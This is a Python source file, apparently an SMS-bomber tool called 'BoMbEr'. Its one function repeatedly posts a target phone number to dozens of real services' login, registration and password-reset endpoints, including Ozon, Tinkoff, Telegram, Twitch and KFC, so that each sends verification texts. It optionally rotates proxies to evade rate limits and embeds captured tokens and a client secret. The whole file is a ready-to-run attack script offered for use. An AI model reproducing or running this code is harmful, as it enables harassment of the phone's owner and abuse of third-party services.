# -*- coding: utf-8 -*-
#!/usr/bin/env python

"""
╔═════════════════════════════════════════════════════════════════════════════════╗
║                                                                                 ║
║                                      BoMbEr                                     ║
║  Author:                                                                        ║
║  https://github.com/ebankoff                                                    ║
║                                                                                 ║
║  The author of this program is not responsible for its use!                     ║
║  When posting this code on other resources, please indicate the author!         ║
║                                                                                 ║
║                               All rights reserved.                              ║
║                           Copyright (C) 2021 ebankoff                           ║
║                                                                                 ║
╚═════════════════════════════════════════════════════════════════════════════════╝
"""

#--------------------------------------(sms)--------------------------------------

import os
import sys
import time
import json
import emoji
import random
import shutil
import socket
import ctypes
import smtplib
import os.path
import asyncio
import requests
import colorama
import datetime
import threading
import user_agent
import progressbar
from time import sleep
from threading import *
from sys import platform
from asyncio import sleep
from getpass import getpass
from os import name, system
from progress.bar import Bar
from threading import Thread
from functools import reduce
from bs4 import BeautifulSoup
from requests import get, post
from selenium import webdriver
from os.path import exists, isfile
from random import choice, randint
from bs4 import BeautifulSoup as bs
from selenium_stealth import stealth
from progress.spinner import Spinner
from selenium.webdriver.common.by import By
from colorama import Fore, Back, Style, init
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import StaleElementReferenceException

colorama.init()

header = {
	"Content-Type": "application/json"
}

def sms(prx, number, tm):
	try:
		if prx == 'yes':
			proxy = []
			t = time.monotonic()

			with open(r"proxies.txt", "r", encoding="utf-8") as file:
				for line in file:
					proxy.append(line)

			proxy = [line.rstrip() for line in proxy]

			while time.monotonic() - t < tm:
				try:
					proxies = {'http': 'http://' + random.choice(proxy), 'https': 'http://' + random.choice(proxy)}
					url = 'https://u.icq.net/api/v48/rapi/auth/sendCode'
					params = {"reqId":"66497-1613742053","params":{"phone": number,"language":"ru-RU","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}}
					requests.post(url, json = params, headers = header, proxies = proxies)
				except:
					pass

				try:
					payload = {"phone": number}
					requests.post("https://api.sunlight.net/v3/customers/authorization/", headers = header, json = payload, proxies = proxies)
				except:
					pass

				try:
					payload = {
						"isSecondFactor":"false",
						"authRequestToken":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJtb2RlIjoxLCJvcmlnaW4iOjEsIndlYmhvb2tfdXJsIjoiL296b25pZC9hdXRoUmVzcG9uc2VJZnJhbWUiLCJwYXlsb2FkIjpudWxsLCJyZXR1cm5fdXJsIjoiLyIsInJlZmVyZXJfcGFnZV90eXBlIjoiIiwicmVxdWlyZWRfZmllbGRzIjpudWxsLCJwYXRjaF91c2VyX2FjY291bnRfcGFyYW1zIjpudWxsLCJiaW5kX2Nhc19pZCI6ZmFsc2UsInVzZV9vaWRjIjpmYWxzZSwib2lkY19kYXRhIjp7fSwiYm91bmRfdXNlcl9pZCI6MCwiZXhwIjoxNjQwOTkxNjg3LCJpYXQiOjE2NDA5MDUyODcsImlzcyI6Im96b25pZCJ9.qToV7QAcND9itU6KGKFH-Vh1bSwB3O-0z1u6iqksISw",
						"isAlphaNumericOtp":"false",
						"hideHints":"false",
						"csrfToken":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZXF1ZXN0VW5peFRpbWUiOjE2NDA5MDUyOTAsInNlc3Npb25JZCI6IkVkQmVRQ3l2VDFtbEpQRHNic09STmcifQ.BqSleOto_RS6GNoXuAUpFdGgNNg1aOd3iIU9srDoK-Y",
						"isOtpExpired":"false",
						"isAdsAllowed":"false",
						"phone":number
					}
					requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntryV3", headers = header, json = payload, proxies = proxies)
				except:
					pass

				try:
					payload = {"app_id": "55e085968a5da59241000001", "phone": number}
					requests.post("https://api.wheely.com/v6/auth/oauth/token", headers = header, json = payload, proxies = proxies)
				except:
					pass

				try:
					payload = {
						"action": "set-sms", 
						"phone": "+" + number,
						"password": "qwertY1234_",
						"role": "1",
						"promocode": "",
						"who": "1",
						"g_token": ""
					}
					requests.post("https://tips.yandex/dhdghfier.html", headers = header, json = payload, proxies = proxies)
				except:
					pass

				try:
					payload = {"sender": "Tele2"}
					requests.post(f"https://spb.tele2.ru/api/validation/number/{number}", headers = header, json = payload, proxies = proxies)
				except:
					pass

				try:
					requests.post("https://api.beget.com/v1/registration/verification", params = {"phone_number:": "+"+number, "request_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzUxMiJ9.eyJpc3MiOiJjYXB0Y2hhLmJlZ2V0LmNvbSIsImlhdCI6MTYzODMxNzQ5NCwiZXhwIjoxNjM4MzE3Njc0LCJqdGkiOiIzNzk2NTAwN2Q1OGRkMjllZTUwNGY5ZDFhOTBjNTA4MiIsImFjdGlvbnMiOlsiXC9iZWdldF9yZWdpc3RyYXRpb25fdjFfcmVnaXN0cmF0aW9uX1JlZ2lzdHJhdGlvblNlcnZpY2VcL3NlbmRWZXJpZmljYXRpb25Db2RlIl19.TKO7gn90NjF9L5b20eYDyl28yYkAwdN2fxLV8f3t3gYWJ0RPH2rNCj0Nsnb4T-DDoWKDorFRapcGNwvoYqNxKNDFEddClt-a1HPapPYuhTqb78uMVGRyKjsgMRdCN2u3PmUXfVKP-XQRGdAxJRGGMzCUuthVs3aOcmE23_wJ6UDyf0c7TaML4HU5S7ov4w4hbFfxe0VomJPZlzin28zlW2Yox-QQffljgmpa81TGH1PuAA0YJTCdO13SDkjDIWYiW0wfrj_yeKVMhlAQ8sf9TXT67brinjuNqiUXsBSGdyKBp26UaV0Tbo403sCpzWGCCubupPcRVVObsuC5bo3Rog"}, headers=header, proxies=proxies)
				except:
					pass

				try:
					requests.post("https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp?pageName=loginByUserPhoneVerification&fromCheckout=false&fromRegisterPage=true&snLogin=&bpg=&snProviderId=", data={"phone":number, "g-recaptcha-response":"", "recaptcha":"on"}, headers=header, proxies = proxies)
				except:
					pass

				try:
					requests.post("https://m.tiktok.com/node-a/send/download_link", json={"slideVerify": 0, "language": "ru", "PhoneRegionCode": "7", "Mobile": number9, "page": {"pageName": "home", "launchMode": "direct", "trafficType": ""}}, headers=header, proxies=proxies)
				except:
					pass

				try:
					payload = {"phone": number}
					requests.post("https://api.iconjob.co/api/auth/verification_code", headers=header, json=payload, proxies=proxies)
				except:
					pass

				try:
					requests.post("https://www.eldorado.ru/_ajax/spa/auth/v2/auth_with_login.php", params = {"user_login": number}, headers=header, proxies=proxies)
				except:
					pass

				try:
					requests.post(r"https://my.drom.ru/sign/code/37c1e0f630c205d7019f96cbb33cb6b9?sign=79192333355&return=https%3A%2F%2Fwww.drom.ru%2F%3Ftcb%3D1636961302", params = {"sign": number, "return": "https://www.drom.ru/?tcb=1636961302"}, headers=header, proxies=proxies)
				except:
					pass

				try:
					requests.post("https://m.tiktok.com/node-a/send/download_link", json={"slideVerify": 0, "language": "ru", "PhoneRegionCode": "7", "Mobile": number, "page": {"pageName": "home", "launchMode": "direct", "trafficType": ""}}, headers=header, proxies=proxies)
				except:
					pass

				try:
					requests.get(f"https://findclone.ru/register?phone=+{number}", proxies = proxies)
				except:
					pass

				try:
					payload = {"phone": "+" + number}
					requests.post("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms", data=payload, headers=header, proxies = proxies)
				except:
					pass

				try:		
					requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": number}, headers=header, proxies = proxies)
				except:
					pass

				try:			
					requests.post(f"https://www.citilink.ru/registration/confirm/phone/+{number}/", headers=header, proxies = proxies)
				except:
					pass

				try:			
					requests.post('https://api.tinkoff.ru/v1/sign_up', data={'loginId': '+' + number}, headers=header, proxies = proxies)
				except:
					pass

				try:
					requests.post('https://www.flipkart.com/api/5/user/otp/generate', data={'phone': '+' + number}, headers=header, proxies = proxies)
				except:
					pass

				try:
					requests.post('https://cloud.mail.ru//api/v2/notify/applink', data={'phone': '+' + number, "api": "2", "email": "email", "x-email": "x-email"}, headers=header, proxies = proxies)
				except:
					pass

				try:
					requests.post('https://youla.ru/web-api/auth/request_code', data={"phone": number}, headers=header, proxies = proxies)
				except:
					pass

				try:
					requests.post('https://my.newtonschool.co:443/api/v1/user/otp', params={"registration": "true"}, data={"phone": '+' + number}, proxies = proxies)
				except:
					pass

				try:
					requests.post('https://mobile-api.qiwi.com/oauth/authorize', data={"response_type": "urn:qiwi:oauth:response-type:confirmation-id", "username": number, "client_id": "android-qw", "client_secret": "zAm4FKq9UnSe7id"}, headers=header, proxies = proxies)
				except:
					pass

				try:
					requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data = {"st.r.phone": number}, headers=header, proxies = proxies)
				except:
					pass

				try:
					requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data = {'phone_number': number}, headers=header, proxies = proxies)
				except:
					pass

				try:
					requests.post("https://www.dns-shop.ru/auth/auth/fast-authorization", data = {"FastAuthorizationLoginLoadForm[login]": number, "FastAuthorizationLoginLoadForm[token]": "", "FastAuthorizationLoginLoadForm[isPhoneCall]": "0"}, headers=header, proxies = proxies)
				except:
					pass

				try:
					requests.post("https://my.telegram.org/auth/send_password", data = {'phone': number}, proxies = proxies)
				except:
					pass

				try:
					requests.post("https://pizzahut.ru/account/password-reset", data = {'reset_by': number, 'action_id':'pass-recovery', 'phone': number, '_token':'*'}, headers=header, proxies = proxies)
				except:
					pass

				try:
					requests.post("https://www.rabota.ru/remind", data = {'credential': number}, headers=header, proxies = proxies)
				except:
					pass

				try:
					requests.post(f"https://www.citilink.ru/registration/confirm/phone/+{number}", headers=header, proxies = proxies)
				except:
					pass

				try:
					requests.post("https://passport.twitch.tv/register?trusted_request=true", headers=header, json = {'birthday': {'day': 17, 'month': 10, 'year': 1998},'client_id': 'qb1unb4b2q4t58fwldcbz2nnm46a8zp','include_verification_code': 'true','password':'RnlFjW22e_n32p8FF','phone_number': number,'username':'123vitek123'}, proxies = proxies)
				except:
					pass

				try:
					requests.post("https://api.sunlight.net/v3/customers/authorization", data = {'phone': number}, headers=header, proxies = proxies)
				except:
					pass

				try:
					requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data = {'st.r.phone': '+'+number}, headers=header, proxies = proxies)
				except:
					pass

				try:
					requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry", data = {'phone': number, 'otpId': 0}, headers=header, proxies = proxies)
				except:
					pass

				try:
					requests.post("https://lenta.com/api/v1/authentication/requestValidationCode", json = {'phone': '+'+number}, headers=header, proxies = proxies)
				except:
					pass

				try:
					requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json = {'phone_number': '+'+number}, headers=header, proxies = proxies)
				except:
					pass

				try:
					requests.post("https://cloud.mail.ru/api/v2/notify/applink", json = {'phone': '+'+number, 'api': 2, 'email': 'email', 'x-email': 'x-email'}, headers=header, proxies = proxies)
				except:
					pass

				try:
					requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data = {'st.r.phone': number}, headers=header, proxies = proxies)
				except:
					pass

		elif prx == 'no':
			t = time.monotonic()

			while time.monotonic() - t < tm:
				try:
					url = 'https://u.icq.net/api/v48/rapi/auth/sendCode'
					params = {"reqId":"66497-1613742053","params":{"phone": number,"language":"ru-RU","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}}
					requests.post(url, json = params, headers = header)
				except:
					pass

				try:
					payload = {"phone": number}
					requests.post("https://api.sunlight.net/v3/customers/authorization/", headers = header, json = payload)
				except:
					pass

				try:
					requests.post("https://api.beget.com/v1/registration/verification", params = {"phone_number:": "+"+number, "request_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzUxMiJ9.eyJpc3MiOiJjYXB0Y2hhLmJlZ2V0LmNvbSIsImlhdCI6MTYzODMxNzQ5NCwiZXhwIjoxNjM4MzE3Njc0LCJqdGkiOiIzNzk2NTAwN2Q1OGRkMjllZTUwNGY5ZDFhOTBjNTA4MiIsImFjdGlvbnMiOlsiXC9iZWdldF9yZWdpc3RyYXRpb25fdjFfcmVnaXN0cmF0aW9uX1JlZ2lzdHJhdGlvblNlcnZpY2VcL3NlbmRWZXJpZmljYXRpb25Db2RlIl19.TKO7gn90NjF9L5b20eYDyl28yYkAwdN2fxLV8f3t3gYWJ0RPH2rNCj0Nsnb4T-DDoWKDorFRapcGNwvoYqNxKNDFEddClt-a1HPapPYuhTqb78uMVGRyKjsgMRdCN2u3PmUXfVKP-XQRGdAxJRGGMzCUuthVs3aOcmE23_wJ6UDyf0c7TaML4HU5S7ov4w4hbFfxe0VomJPZlzin28zlW2Yox-QQffljgmpa81TGH1PuAA0YJTCdO13SDkjDIWYiW0wfrj_yeKVMhlAQ8sf9TXT67brinjuNqiUXsBSGdyKBp26UaV0Tbo403sCpzWGCCubupPcRVVObsuC5bo3Rog"}, headers=header)
				except:
					pass

				try:
					payload = {
						"isSecondFactor":"false",
						"authRequestToken":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJtb2RlIjoxLCJvcmlnaW4iOjEsIndlYmhvb2tfdXJsIjoiL296b25pZC9hdXRoUmVzcG9uc2VJZnJhbWUiLCJwYXlsb2FkIjpudWxsLCJyZXR1cm5fdXJsIjoiLyIsInJlZmVyZXJfcGFnZV90eXBlIjoiIiwicmVxdWlyZWRfZmllbGRzIjpudWxsLCJwYXRjaF91c2VyX2FjY291bnRfcGFyYW1zIjpudWxsLCJiaW5kX2Nhc19pZCI6ZmFsc2UsInVzZV9vaWRjIjpmYWxzZSwib2lkY19kYXRhIjp7fSwiYm91bmRfdXNlcl9pZCI6MCwiZXhwIjoxNjQwOTkxNjg3LCJpYXQiOjE2NDA5MDUyODcsImlzcyI6Im96b25pZCJ9.qToV7QAcND9itU6KGKFH-Vh1bSwB3O-0z1u6iqksISw",
						"isAlphaNumericOtp":"false",
						"hideHints":"false",
						"csrfToken":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZXF1ZXN0VW5peFRpbWUiOjE2NDA5MDUyOTAsInNlc3Npb25JZCI6IkVkQmVRQ3l2VDFtbEpQRHNic09STmcifQ.BqSleOto_RS6GNoXuAUpFdGgNNg1aOd3iIU9srDoK-Y",
						"isOtpExpired":"false",
						"isAdsAllowed":"false",
						"phone":number
					}
					requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntryV3", headers = header, json = payload)
				except:
					pass

				try:
					payload = {"app_id": "55e085968a5da59241000001", "phone": number}
					requests.post("https://api.wheely.com/v6/auth/oauth/token", headers = header, json = payload)
				except:
					pass

				try:
					requests.post("https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp?pageName=loginByUserPhoneVerification&fromCheckout=false&fromRegisterPage=true&snLogin=&bpg=&snProviderId=", data={"phone":number, "g-recaptcha-response":"", "recaptcha":"on"}, headers=header)
				except:
					pass

				try:
					requests.post("https://m.tiktok.com/node-a/send/download_link", json={"slideVerify": 0, "language": "ru", "PhoneRegionCode": "7", "Mobile": number9, "page": {"pageName": "home", "launchMode": "direct", "trafficType": ""}}, headers=header)
				except:
					pass

				try:
					payload = {
						"action": "set-sms", 
						"phone": "+" + number,
						"password": "qwertY1234_",
						"role": "1",
						"promocode": "",
						"who": "1",
						"g_token": ""
					}
					requests.post("https://tips.yandex/dhdghfier.html", headers = header, json = payload)
				except:
					pass

				try:
					payload = {"sender": "Tele2"}
					requests.post(f"https://spb.tele2.ru/api/validation/number/{number}", headers = header, json = payload)
				except:
					pass

				try:
					requests.post("https://api.iconjob.co/api/auth/verification_code", json={"phone": number}, headers=header)
				except:
					pass

				try:
					requests.post("https://www.eldorado.ru/_ajax/spa/auth/v2/auth_with_login.php", params = {"user_login": number}, headers=header)
				except:
					pass

				try:
					requests.post(r"https://my.drom.ru/sign/code/37c1e0f630c205d7019f96cbb33cb6b9?sign=79192333355&return=https%3A%2F%2Fwww.drom.ru%2F%3Ftcb%3D1636961302", params = {"sign": number, "return": "https://www.drom.ru/?tcb=1636961302"}, headers=header)
				except:
					pass

				try:
					requests.post("https://m.tiktok.com/node-a/send/download_link", json={"slideVerify": 0, "language": "ru", "PhoneRegionCode": "7", "Mobile": number, "page": {"pageName": "home", "launchMode": "direct", "trafficType": ""}}, headers=header)
				except:
					pass

				try:
					requests.get(f"https://findclone.ru/register?phone=+{number}")
				except:
					pass

				try:
					requests.post("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms", data={"phone": "+" + number}, headers=header)
				except:
					pass

				try:		
					requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": number}, headers=header)
				except:
					pass

				try:			
					requests.post(f"https://www.citilink.ru/registration/confirm/phone/+{number}/", headers=header)
				except:
					pass

				try:			
					requests.post('https://api.tinkoff.ru/v1/sign_up', data={'loginId': '+' + number}, headers=header)
				except:
					pass

				try:
					requests.post('https://www.flipkart.com/api/5/user/otp/generate', data={'phone': '+' + number}, headers=header)
				except:
					pass

				try:
					requests.post('https://cloud.mail.ru//api/v2/notify/applink', data={'phone': '+' + number, "api": "2", "email": "email", "x-email": "x-email"}, headers=header)
				except:
					pass

				try:
					requests.post('https://youla.ru/web-api/auth/request_code', data={"phone": number}, headers=header)
				except:
					pass

				try:
					requests.post('https://my.newtonschool.co:443/api/v1/user/otp', params={"registration": "true"}, data={"phone": '+' + number})
				except:
					pass

				try:
					requests.post('https://mobile-api.qiwi.com/oauth/authorize', data={"response_type": "urn:qiwi:oauth:response-type:confirmation-id", "username": number, "client_id": "android-qw", "client_secret": "zAm4FKq9UnSe7id"}, headers=header)
				except:
					pass

				try:
					requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data = {"st.r.phone": number}, headers=header)
				except:
					pass

				try:
					requests.post("https://www.dns-shop.ru/auth/auth/fast-authorization", data = {"FastAuthorizationLoginLoadForm[login]": number, "FastAuthorizationLoginLoadForm[token]": "", "FastAuthorizationLoginLoadForm[isPhoneCall]": "0"}, headers=header)
				except:
					pass

				try:
					requests.post("https://my.telegram.org/auth/send_password", data = {'phone': number})
				except:
					pass

				try:
					requests.post("https://pizzahut.ru/account/password-reset", data = {'reset_by': number, 'action_id':'pass-recovery', 'phone': number, '_token':'*'}, headers=header)
				except:
					pass

				try:
					requests.post("https://www.rabota.ru/remind", data = {'credential': number}, headers=header)
				except:
					pass

				try:
					requests.post(f"https://www.citilink.ru/registration/confirm/phone/+{number}")
				except:
					pass

				try:
					requests.post("https://passport.twitch.tv/register?trusted_request=true", json = {'birthday': {'day': 17, 'month': 10, 'year': 1998},'client_id': 'qb1unb4b2q4t58fwldcbz2nnm46a8zp','include_verification_code': 'true','password':'RnlFjW22e_n32p8FF','phone_number': number,'username':'123vitek123'}, headers=header)
				except:
					pass

				try:
					requests.post("https://api.sunlight.net/v3/customers/authorization", data = {'phone': number}, headers=header)
				except:
					pass

				try:
					requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data = {'st.r.phone': '+'+number}, headers=header)
				except:
					pass

				try:
					requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry", data = {'phone': number, 'otpId': 0}, headers=header)
				except:
					pass

				try:
					requests.post("https://lenta.com/api/v1/authentication/requestValidationCode", json = {'phone': '+'+number}, headers=header)
				except:
					pass

				try:
					requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json = {'phone_number': '+'+number}, headers=header)
				except:
					pass

				try:
					requests.post("https://cloud.mail.ru/api/v2/notify/applink", json = {'phone': '+'+number, 'api': 2, 'email': 'email', 'x-email': 'x-email'}, headers=header)
				except:
					pass

				try:
					requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data = {'st.r.phone': number}, headers=header)
				except:
					pass

		else:
			pass

	except:
		pass